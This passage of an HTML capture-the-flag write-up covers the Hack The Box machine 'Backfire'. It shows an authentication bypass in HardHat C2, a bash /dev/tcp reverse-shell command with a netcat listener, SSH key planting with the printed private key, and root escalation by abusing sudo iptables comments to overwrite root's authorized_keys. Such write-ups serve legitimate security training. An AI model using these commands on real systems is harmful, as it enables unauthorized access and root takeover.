<pre><code>python3 auth_bypass.py -u sergej -p 1w4nt2sw1tch2h4rdh4tc2 -i 127.0.0.1 -p 7096
[+] User created !
[+] Use sergej as the username and 7096  as the password to login in HardHat C2!</code></pre>
</div></div>
<p>By exploiting the authentication bypass in HardHatC2, we were able to log in using the username <strong>sergej</strong> and the password <strong>7096</strong>. This successfully granted us access to the HardHat C2 client interface, allowing further interaction with the system.</p>
<img src="./web4.jpg" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
<br><br>
<p>After clicking on the &quot;Interact&quot; button on the <strong>HardHatC2</strong> main page, we are presented with a terminal where commands can be executed directly. This allows us to run a reverse shell command from the client interface to establish a connection back to our system.</p><p>Here&#x27;s the process:</p><ol type="1" class="numbered-list" start="1"><li><strong>Access the Interact Terminal</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">In the HardHatC2 client, click on &quot;Interact&quot; to open the terminal where commands can be executed.</li></ul></li></ol><ol type="1" class="numbered-list" start="2"><li><strong>Execute Reverse Shell Command</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">Use the terminal to run a reverse shell command that connects back to your machine.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Example command to start a reverse shell:<strong>bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;</strong></li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Replace <code>&lt;your-ip&gt;</code> with your IP address and <code>&lt;your-port&gt;</code> with the port number that you&#x27;ll be listening on.</li></ul></li></ol><ol type="1" class="numbered-list" start="3"><li><strong>Set up a Netcat Listener</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">On your attack machine, start a Netcat listener to catch the reverse shell.</li></ul></li></ol><ol type="1" class="numbered-list" start="4"><li><strong>Get the Shell</strong>:<ul class="bulleted-list"><li style="list-style-type:disc">Once the reverse shell command is executed, you should see a connection in the Netcat listener, granting you access to the target system&#x27;s shell.</li></ul></li></ol><p>This method leverages the HardHatC2 interface to directly interact with the target system, facilitating a stable reverse shell connection.</p>
<img src="./web5.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
<br><br>
<p>Since the reverse shell was unstable and a cron job was running that automatically disconnected the shell, we generated an SSH keypair for the <strong>sergej</strong> user using <code>ssh-keygen</code>. The public key was then added to the <code>authorized_keys</code> file, allowing us to log in via SSH using the corresponding private key. This provided a stable and persistent connection, bypassing the instability caused by the reverse shell and cron job, ensuring continued access to the system.</p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.33] from (UNKNOWN) [10.129.205.176] 49818
bash: cannot set terminal process group (10200): Inappropriate ioctl for device
bash: no job control in this shell
sergej@backfire:/$ ls
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
sergej@backfire:/$ ssh-keygen -t rsa -b 4096 -C &quot;sergej&quot;
ssh-keygen -t rsa -b 4096 -C &quot;sergej&quot;
Generating public/private rsa key pair.
Enter file in which to save the key (/home/sergej/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): apple
Enter same passphrase again: apple
cdYour identification has been saved in /home/sergej/.ssh/id_rsa
Your public key has been saved in /home/sergej/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:OnK48NcZd33m7F+9lkwzJ97YwsspHvkBVfgI4R2qZMY sergej
The key&#x27;s randomart image is:
+---[RSA 4096]----+
|            .....|
|         . ..o.o |
|          E o.oo |
|         + . .. .|
|        S . ..   |
|     . .. . .oo+=|
|  . o +. + .oo+XB|
|   o +..o   .+=*B|
|    o.     ...*=+|
+----[SHA256]-----+
sergej@backfire:/$ cd /home/sergej/.ssh/
cdcd /home/sergej/.ssh/
bash: cdcd: command not found
sergej@backfire:/$ cd /home/sergej/.ssh/
cd /home/sergej/.ssh/
sergej@backfire:~/.ssh$ cat id_rsa.pub
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCNnuyfEx2vYJ8Vx8bINNHBHbB90nQxjFib3mRqx6GNEwi/l3EPF4Mjq8ZnE5Ec9D26Yb2RUX3bz8WsglnZur3Ym8pUis4sJ9QFeLy4CFMetJxzBTW/DsC6Zk0YzzZvkpAsY0moTV3pMOmcS3MU/08VAO/RurXoFURcTL32XrVz6XkTY/eJkwOyTJz6DPNMI2hN1J0RGlcWHuBG1Skkopjf08DRfzXJpnfK9Q6q7WVjsGJKxoPBDyr7Pu7oK+58TI3HtdAFyaMHDG9toubAiIb7fuzL+IbfjV/flqT+m6x/tE9LUllmbtysGAdWKAXD85AE/d1zAv3tJ+VE/1okuJXq0EI35GxXsUL7xd0nVOCt8NZLNyA4c3Ikytj3UOfH1ZTDmwOBk2aEStguY+tRn7f6iI1tcjCMZZt44TMTSiQQuD8TwADxHFYQEdYwUROdMtaPC1VDm6dhl8Rv+CUYGYhmCQLK9XsPbyhlGkijoZJf5t8cLpdvWaxRLvsVfu0lacevDSHpV8N8JX320soHieujIoQnFdjP7/GBKgIrn3sdwQo/TfST3hAcuXy9RnKHunqzYVlfsLBLqUtMVI9CYL71jt/QOGbgKmtPY60seDrspyiy4uhmtBOu1+a2bwFR5ANKfxbuExDBQGz/9u0nrvhqlmxPUxV97y7cVYLNKrdPUw== sergej
sergej@backfire:~/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCNnuyfEx2vYJ8Vx8bINNHBHbB90nQxjFib3mRqx6GNEwi/l3EPF4Mjq8ZnE5Ec9D26Yb2RUX3bz8WsglnZur3Ym8pUis4sJ9QFeLy4CFMetJxzBTW/DsC6Zk0YzzZvkpAsY0moTV3pMOmcS3MU/08VAO/RurXoFURcTL32XrVz6XkTY/eJkwOyTJz6DPNMI2hN1J0RGlcWHuBG1Skkopjf08DRfzXJpnfK9Q6q7WVjsGJKxoPBDyr7Pu7oK+58TI3HtdAFyaMHDG9toubAiIb7fuzL+IbfjV/flqT+m6x/tE9LUllmbtysGAdWKAXD85AE/d1zAv3tJ+VE/1okuJXq0EI35GxXsUL7xd0nVOCt8NZLNyA4c3Ikytj3UOfH1ZTDmwOBk2aEStguY+tRn7f6iI1tcjCMZZt44TMTSiQQuD8TwADxHFYQEdYwUROdMtaPC1VDm6dhl8Rv+CUYGYhmCQLK9XsPbyhlGkijoZJf5t8cLpdvWaxRLvsVfu0lacevDSHpV8N8JX320soHieujIoQnFdjP7/GBKgIrn3sdwQo/TfST3hAcuXy9RnKHunqzYVlfsLBLqUtMVI9CYL71jt/QOGbgKmtPY60seDrspyiy4uhmtBOu1+a2bwFR5ANKfxbuExDBQGz/9u0nrvhqlmxPUxV97y7cVYLNKrdPUw== sergej&quot; &gt;&gt; ~/.ssh/authorized_keys
&lt;97y7cVYLNKrdPUw== sergej&quot; &gt;&gt; ~/.ssh/authorized_keys
sergej@backfire:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCv+jjHWn
SIXNRHeCu98OKKAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQCNnuyfEx2v
YJ8Vx8bINNHBHbB90nQxjFib3mRqx6GNEwi/l3EPF4Mjq8ZnE5Ec9D26Yb2RUX3bz8Wsgl
nZur3Ym8pUis4sJ9QFeLy4CFMetJxzBTW/DsC6Zk0YzzZvkpAsY0moTV3pMOmcS3MU/08V
AO/RurXoFURcTL32XrVz6XkTY/eJkwOyTJz6DPNMI2hN1J0RGlcWHuBG1Skkopjf08DRfz
XJpnfK9Q6q7WVjsGJKxoPBDyr7Pu7oK+58TI3HtdAFyaMHDG9toubAiIb7fuzL+IbfjV/f
lqT+m6x/tE9LUllmbtysGAdWKAXD85AE/d1zAv3tJ+VE/1okuJXq0EI35GxXsUL7xd0nVO
Ct8NZLNyA4c3Ikytj3UOfH1ZTDmwOBk2aEStguY+tRn7f6iI1tcjCMZZt44TMTSiQQuD8T
wADxHFYQEdYwUROdMtaPC1VDm6dhl8Rv+CUYGYhmCQLK9XsPbyhlGkijoZJf5t8cLpdvWa
xRLvsVfu0lacevDSHpV8N8JX320soHieujIoQnFdjP7/GBKgIrn3sdwQo/TfST3hAcuXy9
RnKHunqzYVlfsLBLqUtMVI9CYL71jt/QOGbgKmtPY60seDrspyiy4uhmtBOu1+a2bwFR5A
NKfxbuExDBQGz/9u0nrvhqlmxPUxV97y7cVYLNKrdPUwAAB0BCB2kweK5jUz3ZN2skwG0j
kH358EWY3Z0FPHfD76WaYpPqS8Peni2F0nzk99J4HHret1pnk20gViuYBlMZDWRk5D9xoM
B6TrDARxV9djrCujagJiwpu7s778ZGJlJoEb5FwPKFEfdv/lqs/njdl1nocjbk9H5hyMZ8
GCzBHPMJ9WSDCnOqJEluVWWz4dhD58BKR1egRBA4qrttS9PAdJ/jS6gG7he6I3PWJx6Sr2
l3JGYb0+Q9Kp7k3hLv3600xQCM0TPzgQ7CCfJ8EJz0WAR18J2nFsfCyOkBLGmlmxSNhOGh
Nxx44Kp1v2s/qmSfjP86gCgOMRsGZe+JhiqhRUTzVL8AcZsnR4QsqNVGoT2HmZdcFT1vDe
eEbtOwiO2U01AqH4Z0jF4u3n8OxfDa2lDza9+jep123EURRJY9OTU6Xt0VOAFo7WpkhqS8
VzvcHejg61N13YdKhJaKe/pJwoDwt6LLlN8oMUlB8Q2a4xow//tU874leCDnxRAR2zXfgl
Ug/qsrodBNqiec062Jkfuyjxn6rI2tuEauFrdcOukebx53crifbbA7NAgJYjhHWcVkK/p2
qSo3VBiJI6yicEbOZaRbktlHLbJuEN43P85vWY8IDCk88rJbTbYX/gsa75n/5uCGRDhYdn
r1sEKoMQJ2pr2+umqRXPJYGK/gsOBrxf2VSsX2CNdcXObGdvykzSjf3t4IMhyp38TYaLhF
Rq0+8vx5H6WEy6nK0WA2/0nFMnoDoENPCEcKw4Ql7JqEweIU724bX9HJqcYnpcYZR5Crh6
Whv7uVVnlBSlKQXFUgl+meLYYpZEXtsBd9ClOnxes5JraYLcysd6iNCU+O/p/XftdGcx/u
0nC4EN7ckIuRduX/swkQG903tD9iX9pdRU65dmJk/RGN6gRit2mbZmCctJaKuvdC9Gk3MU
OpiA+qf0FU+o01M80GmpjWWidwLDrwuduU7gcbTjE5ksfuvD5cIsT/drYKa+waLn15+Idb
zQ0Dq2jfrodc0GjMcO908wJffWbl7nYjLiacIpkSnfloN0qdHSh3JSXXErOVQZvcyiijaA
NEftXWEXDIyZs0x03TrgyRdzirufVkRqZ7xoaFoaGzv6kxsMKqnmqNSH2yShSdLqv3UWRA
maHwUiE70OtoYM0xAcy8dWzHOUDc93DMtOctPAE5TTnFkIoPcwhVXIxEaWmWr/8t4n2jZs
7LUNaiCaYYu88P9galfSBcLBXJlZs8PbCz2TqimgnzaLZNOb97mAcrXbGXjKqmFgg6qusZ
RXUSKMZYjGZbStKWRkrytJdErNLPvI1PAkf7hw5kfiDVcyzWmsFxvJMf6lVHN7isGwGXLD
Jty9aOmjDY8cFXoDqFFKhisg7k/z3lHQSsbSd+3j9BPDMzMIC0nOdYNUTMfmMSKdH7KocS
nZ8dqlz0tTtqNyFVMkmjV4pBWkXx20kcFkSCduxZvSeG97cuawIRLxo4/0XrdHSBdg7NGy
exRemVlykFaQd6CTVmTFtLPeF+agubH4ZHuZMMfhfyo3Qts7/0gWGyRSCYKKbP8HNm1hO3
6RXGOs/rApzD+HWH4YRJGhqHV+tw8lxTsIyBMWziPHvbTaJAPXqQSIHavRBAsNHCht64yE
gPQMzL+r4fJIc09OPHS9OdQK1Cf0dIx/YQ4mFefBguIzZyzA9exI2/24CC+bHvRUfppZFW
yjo00R3TR5VscLjRlbW/kuED4ATlMnGd+nAKVMz89NP0R3WnZXvtJMDG2U/adBh75dY0Vf
/qRArKuGFWCGUv6irRx6lakSWfJY1HJjaQtNsDkY/XilEejdsCL6XwuEpMPryBS2mjAnt3
p17CG2utJ0z8UEtmNR04wxAMo83i3UznmaPvq0nlfNG3G8JyiXXSmieA3HiDQK/bva3dww
+mR3GVfZ1sIU9Q23ApmfK6RhwWA016CyyARyVXAKi+gVjGExHpvRmXRxKqjikhy1wxT5ng
sQ0cj7wLQ2QjTymJXiPiPhHBhQYqcX9CuElpXt7yuHXtTLmIWtRrYBXz/lKHBXBLLaiWD6
7SdYfzjtaROEEI6dBAm84aL8GhLGrvGQA2XyohpKPRhy1XDaQ8cUMcBcPtEPW7axfd+Lng
0d3+ViTTNN5vToE+B8ZS+4/KIpsotqx6USSWEg+Q+IaTnoo6iimmd+6EuKKINsoH56OgZc
RfBFt+s0X/F7SWX8cjqvlRIFVpGkZ+N9YnbY/YC3vUzdLDWoYVnh/dCxmiCB3eKwNFPpPx
JKUpziF3PBvFP/Vvfq8UL0WtwQlXMtLLWbkfhfraRQPFgM3eeFMy+xmvaMBjp8PNPhg56g
zZuWv6fGUuh4N2gEcq7yVwaisMoi9Xny3Zljft5XB7PasuiUJLo5HuRwQqCaO9MBi3drHN
lADYBOc7wTs3y5NfmyVRogBvIO2GtqICFMJI+bxS4rfWbGedk1zjeEE+X6PszHVQ+oeaOn
ewew==
-----END OPENSSH PRIVATE KEY-----
sergej@backfire:~/.ssh$       </code></pre>
</div>
</div>
</section>

<section id="Privilege Escalation" class="section">
<h2>Privilege Escalation:</h2>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>                                                                                                                                                                                                                                          
┌──(deepak㉿kali)-[~/HTB_Machines/Medium_linux/Backfire]
└─$ ssh -i id_rsa sergej@backfire.htb
Enter passphrase for key &#x27;id_rsa&#x27;: 
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
sergej@backfire:~$ sudo -l
Matching Defaults entries for sergej on backfire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save</code></pre>
    </div></div>  
    <p>By running <code>sudo -l</code> as the <strong>sergej</strong> user, we discover that the user has <code>NOPASSWD</code> privileges for the following commands:</p><ol type="1" class="numbered-list" start="1"><li><code><strong>/usr/sbin/iptables</strong></code></li></ol><ol type="1" class="numbered-list" start="2"><li><code><strong>/usr/sbin/iptables-save</strong></code></li></ol><p>This means <strong>sergej</strong> can execute these commands as <strong>root</strong> without being prompted for a password. This is a valuable opportunity to escalate privileges by using <code>iptables</code> to modify firewall rules or create a backdoor for persistent access.</p><p>We can escalate this different methods :</p><p><a href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/">https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/</a></p><p>The comment function is used to overwrite other files, so you can consider overwriting some sensitive files, especially those that can forge the root identity.</p><p>After testing, the length of this comment cannot be too long, so the length of the ssh key should be relatively short.</p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">  
    <pre><code>                                                                                                                                                                                                                                ┌──(deepak㉿kali)-[~/.ssh]
└─$ ssh-keygen -t ed25519</code></pre>
</div></div>
<p>Then overwrite the root key file</p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal"> 
<pre><code>sergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $&#x27;\n YourKeysHere\n&#x27;
sergej@backfire:~$ sudo /usr/sbin/iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i lo -m comment --comment &quot;YourKeysHere&quot; -j ACCEPT
sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys</code></pre>
</div></div>
<p>After overwriting the<code> id_rsa.pub</code> in the <code>authorized_keys</code> file, we are able to connect to the target system via SSH using the corresponding private key. This allows us to establish a stable and persistent SSH session. Once connected as <strong>root</strong>, we can retrieve the <strong>root.txt</strong> flag, completing the privilege escalation and gaining full access to the system.</p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal"> 
<pre><code>ssh -i id_ed25519 root@backfire.htb
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
root@backfire:~# ls
root.txt</code></pre>
</div></div>
</section>
 </div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
